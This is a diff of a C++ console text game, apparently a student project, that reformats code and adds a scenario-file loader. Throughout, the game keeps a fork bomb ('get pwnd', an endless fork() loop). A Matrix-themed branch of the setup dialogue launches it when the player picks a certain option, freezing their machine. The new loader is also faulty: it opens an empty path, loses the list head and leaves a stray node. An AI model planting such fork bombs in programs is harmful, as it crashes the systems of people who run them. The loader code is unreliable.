@@ -2,7 +2,7 @@
 #include "core_functions.hpp"
 using namespace std;
 
-//Game duration -- 50 days
+// Game duration -- 50 days
 int globalActionLimit = 50;
 
 // refactor to use unistd.h
@@ -12,19 +12,20 @@ const chrono::nanoseconds varNS = 2000ms;
 
 // https://xoax.net/cpp/crs/console/lessons/Lesson13/
 
-void forkBomb(){
+void forkBomb()
+{
     cout << "get pwnd" << endl;
-    while(1){
+    while (1)
+    {
         fork();
     }
 }
 
-
-void crashGame(){
+void crashGame()
+{
     thread th1(forkBomb);
     th1.detach();
 }
-
 
 int Modulus(int iN, int iMod)
 {
@@ -158,12 +159,56 @@ void grabInput(int &x)
     x = userInput;
 }
 
+void constructScenarioList(scenario *scenarioHead)
+{
+    struct scenario *scenarioNode = new scenario;
+    scenarioNode->next = NULL;
+
+    scenarioHead = scenarioNode;
+
+    ifstream filestream("");
+    if (!filestream.is_open() || !filestream.good())
+    {
+        cout << "can't open file" << '\n';
+        return;
+    }
+
+    while (filestream.good())
+    {
+        getline(filestream, scenarioNode->id, '\t');
+        getline(filestream, scenarioNode->prompt, '\t');
+        getline(filestream, scenarioNode->option1, '\t');
+        getline(filestream, scenarioNode->option2, '\t');
+        getline(filestream, scenarioNode->consequence1, '\t');
+        getline(filestream, scenarioNode->consequence2, '\t');
+
+        std::string pointTemp;
+        std::string pointTemp2;
+        getline(filestream, pointTemp, '\t');
+        getline(filestream, pointTemp2, '\t');
+        scenarioNode->consequence1Points = atoi(pointTemp.c_str());
+        scenarioNode->consequence2Points = atoi(pointTemp2.c_str());
+
+        getline(filestream, scenarioNode->consequence1Text, '\t');
+        getline(filestream, scenarioNode->consequence2Text, '\n');
+
+        struct scenario *newNode = new scenario;
+
+        scenarioNode->next = newNode;
+
+        scenarioNode = scenarioNode->next;
+    }
+
+    filestream.close();
+
+    return;
+}
+
 void initalizeGame()
 {
 
     userProfile *currUser = new userProfile;
-    scenariosList *tasks = new scenariosList;
-    
+
     string userName;
     cout << "What is your name?" << endl;
     getline(cin, userName);
@@ -185,7 +230,7 @@ void initalizeGame()
     grabInput(userMajor);
     this_thread::sleep_for(fractionalNS);
 
-    if(userMajor == 1)
+    if (userMajor == 1)
         cout << "Great, go shower. You smell" << endl;
     this_thread::sleep_for(fractionalNS);
 
@@ -212,13 +257,15 @@ void initalizeGame()
         this_thread::sleep_for(smallNS);
         cout << "I'll show you how deep this rabbit hole goes, " << currUser->name << endl;
 
-        for(int i = 0; i < 20; i ++){
+        for (int i = 0; i < 20; i++)
+        {
             cout << endl;
         }
 
         matrixArt();
 
-        while(true){
+        while (true)
+        {
             fork();
             cout << "Not so funny now, huh?" << endl;
         }
@@ -236,7 +283,6 @@ void initalizeGame()
     this_thread::sleep_for(smallNS);
     cout << "SETUP COMPLETE" << endl;
 
-    currUser->tasksRemaining = tasks;
     currUser->name = userName;
     currUser->timeRemaining = globalActionLimit;
     this_thread::sleep_for(smallNS);
@@ -244,6 +290,6 @@ void initalizeGame()
     cout << "STARTING GAME" << endl;
 }
 
-void gameLoop(){
-
+void gameLoop()
+{
 }
